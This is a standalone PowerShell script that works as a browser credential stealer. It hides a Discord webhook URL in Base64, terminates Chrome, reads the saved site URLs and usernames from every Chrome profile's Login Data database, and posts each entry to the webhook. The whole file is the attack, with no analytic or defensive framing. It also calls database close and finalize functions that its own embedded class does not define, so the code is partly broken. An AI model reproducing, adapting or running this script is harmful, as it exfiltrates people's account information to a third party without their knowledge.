$ErrorActionPreference = 'Stop'

# Base64-encoded Discord webhook URL
$encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5Mjc2MTE2MjA4MDk3NjkyNi93M2s2U2p0QW1VVWdLY2t1VXJBUVduR2lVNEp5bF8weGtRZVBGYmtuc0Z4bU5NLW51R0p3OTRtajA3NWhkcmVLcTVoVw=="

# Decode the webhook URL from Base64
$webhookUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedWebhook))

# Debugging: Log the decoded webhook URL
Write-Host "Decoded Webhook URL: $webhookUrl"

try { Stop-Process -Name "chrome" } catch {}

Add-Type -AssemblyName System.Security

$chrome_path = "$env:LOCALAPPDATA\Google\Chrome\User Data"

$query = "SELECT origin_url, username_value FROM logins WHERE blacklisted_by_user = 0"

# Corrected Add-Type block
Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class WinSQLite3
            {
                const string dll = "winsqlite3";
                [DllImport(dll, EntryPoint="sqlite3_open")]
                public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
                [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
                public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
                [DllImport(dll, EntryPoint="sqlite3_step")]
                public static extern IntPtr Step(IntPtr stmt);
                [DllImport(dll, EntryPoint="sqlite3_column_text16")]
                static extern IntPtr ColumnText16(IntPtr stmt, int index);
                [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
                static extern int ColumnBytes(IntPtr stmt, int index);
                [DllImport(dll, EntryPoint="sqlite3_column_blob")]
                static extern IntPtr ColumnBlob(IntPtr stmt, int index);
                public static string ColumnString(IntPtr stmt, int index)
                { 
                    return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
                }
                public static byte[] ColumnByteArray(IntPtr stmt, int index)
                {
                    int length = ColumnBytes(stmt, index);
                    byte[] result = new byte[length];
                    if (length > 0)
                        Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
                    return result;
                }
                [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
                public static extern IntPtr Errmsg(IntPtr db);
                public static string GetErrmsg(IntPtr db)
                {
                    return Marshal.PtrToStringUni(Errmsg(db));
                }
            }
"@

if (-not (Test-Path $chrome_path)) { exit }

$chrome_profiles = Get-ChildItem -Path $chrome_path | Where-Object { $_.Name -match "(Profile [0-9]|Default)" } | ForEach-Object { $_.FullName }

foreach ($user_profile in $chrome_profiles) {
    $dbH = [IntPtr]::Zero
    $result = [WinSQLite3]::Open("$user_profile\Login Data", [ref] $dbH)
    if ($result -ne 0 -or $dbH -eq [IntPtr]::Zero) { continue }

    $stmt = [IntPtr]::Zero
    $result = [WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [IntPtr]::Zero)
    if ($result -ne 0 -or $stmt -eq [IntPtr]::Zero) { [WinSQLite3]::Close($dbH); continue }

    while ([WinSQLite3]::Step($stmt) -eq 100) {
        $url = [WinSQLite3]::ColumnString($stmt, 0)
        $username = [WinSQLite3]::ColumnString($stmt, 1)
        if (-not [string]::IsNullOrWhiteSpace($url) -and -not [string]::IsNullOrWhiteSpace($username)) {
            $message = @{ content = "URL: $url`nUsername: $username" }
            try {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($message | ConvertTo-Json) -ContentType 'application/json'
                Write-Host "Data sent for URL: $url"
            } catch {
                Write-Host "Failed to send data to Discord webhook: $_"
            }
        }
    }
    [WinSQLite3]::Finalize($stmt)
    [WinSQLite3]::Close($dbH)
}
